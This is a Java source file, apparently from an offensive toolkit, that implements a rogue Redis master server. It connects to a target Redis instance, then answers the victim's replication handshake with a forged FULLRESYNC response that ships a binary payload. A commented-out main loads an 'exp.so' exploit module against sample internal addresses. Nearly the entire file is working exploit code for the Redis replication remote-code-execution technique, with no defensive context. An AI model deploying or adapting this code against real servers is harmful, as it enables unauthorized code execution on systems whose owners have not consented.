package org.fasnow.mutiple.model.redis;


import org.fasnow.mutiple.HttpClient;
import org.fasnow.mutiple.Utils;

import java.io.*;
import java.net.*;
import java.util.Enumeration;

public class FakeServer {
    public static final String CRLF = "\r\n";
    String lhost;
    int lport;
    String rhost;
    int rport;
    byte[] payload;

    ServerSocket serverSocket;
    Socket server;
    boolean successExited;

    Redis redis;
    public FakeServer(String lhost, int lport, String rhost, int rport, String password,byte[] payload) throws Exception {
        this.payload = payload;
        this.lhost = lhost;
        this.lport = lport;
        this.rhost = rhost;
        this.rport = rport;
        redis = new Redis();
        redis.connect(rhost,rport,password, HttpClient.getDefaultTimout());

        //判断是否需要密码
        redis.getInfo();
    }

    public Redis getRedis() {
        return redis;
    }

    public void  listen() throws Exception {
        serverSocket = new ServerSocket(lport, 50, InetAddress.getByName(lhost));
    }

    public void close() throws IOException {
        if(server!= null && !server.isClosed()){
            server.close();
        }
        if(serverSocket!= null && !serverSocket.isClosed()){
            serverSocket.close();
        }
        successExited = true;
    }

    public boolean successExited(){
        return successExited;
    }

    public void handleAccept() throws Exception {
        server = serverSocket.accept();
        String addr = server.getInetAddress().getHostAddress();
        int port = server.getPort();
        System.out.printf("Accepted connection from %s:%s%n",addr,port);
        try {
            InputStream inputStream = server.getInputStream();

            byte[] buffer = new byte[1024];
            int bytesRead;
            while ((bytesRead = inputStream.read(buffer)) != -1) {
                String message = new String(buffer, 0, bytesRead);
                handleReplicationReq(message);
                System.out.println("Received message: \n" + message);
            }
        } catch (IOException e) {
            e.printStackTrace();
        } catch (Exception e) {
            throw new RuntimeException(e);
        }
    }

    private void handleReplicationReq(String msg) throws Exception {
        DataOutputStream out = new DataOutputStream(server.getOutputStream());
        if(msg.contains("PING")){
            out.write(("+PONG"+ CRLF).getBytes());
        } else if (msg.contains("REPLCONF")) {
            out.write(("+OK"+ CRLF).getBytes());
        }else if (msg.contains("AUTH") ) {
            out.write(("+OK"+ CRLF).getBytes());
        }else if (msg.contains("PSYNC")|| msg.contains("SYNC") ) {
            String resp = "+FULLRESYNC " + Utils.StringRepeat("Z", 40) + " 0" + CRLF + "$" + payload.length + CRLF;
            byte[] arr1 = resp.getBytes();
            byte[] arr2 = CRLF.getBytes();
            byte[] arr3 = new byte[arr1.length + payload.length + arr2.length];
            System.arraycopy(arr1, 0, arr3, 0, arr1.length);
            System.arraycopy(payload, 0, arr3, arr1.length, payload.length);  // 修正这里的偏移量
            System.arraycopy(arr2, 0, arr3, arr1.length + payload.length, arr2.length);  // 修正这里的偏移量
            out.write(arr3);
        }
    }

    public static byte[] readBinaryResource(String resourceName) {
        try {
            // 使用 ClassLoader 加载资源
            InputStream inputStream = FakeServer.class.getClassLoader().getResourceAsStream(resourceName);

            if (inputStream != null) {
                // 读取资源的二进制数据
                byte[] buffer = new byte[4096];
                int bytesRead;
                // 使用 ByteArrayOutputStream 保存二进制数据
                ByteArrayOutputStream outputStream = new ByteArrayOutputStream();

                while ((bytesRead = inputStream.read(buffer)) != -1) {
                    outputStream.write(buffer, 0, bytesRead);
                }

                return outputStream.toByteArray();
            } else {
                System.err.println("Resource not found: " + resourceName);
            }
        } catch (IOException e) {
            e.printStackTrace();
        }

        return new byte[0]; // 返回空数组表示读取失败
    }


//    public static void main(String[] args) throws Exception {
//        byte[] payload = FakeServer.readBinaryResource("redis/exp.so");
//        FakeServer server = new FakeServer("192.168.3.117",18000,"10.0.0.13",6379,"123456",payload);
//        server.listen();
//        server.handleAccept();
//
//    }
    public static void main(String[] args) {
        try {
            // 获取本地所有的网络接口
            Enumeration<NetworkInterface> networkInterfaces = NetworkInterface.getNetworkInterfaces();

            while (networkInterfaces.hasMoreElements()) {
                NetworkInterface networkInterface = networkInterfaces.nextElement();

                // 获取该网络接口上的所有IP地址
                Enumeration<InetAddress> inetAddresses = networkInterface.getInetAddresses();

                while (inetAddresses.hasMoreElements()) {
                    InetAddress inetAddress = inetAddresses.nextElement();

                    // 过滤掉IPv6地址
//                    if (!inetAddress.isLoopbackAddress() && !inetAddress.getHostAddress().contains(":")) {
                        System.out.println("网络接口: " + networkInterface.getDisplayName());
                        System.out.println("IP地址: " + inetAddress.getHostAddress());
                        System.out.println();
//                    }
                }
            }
        } catch (SocketException e) {
            e.printStackTrace();
        }
    }

}
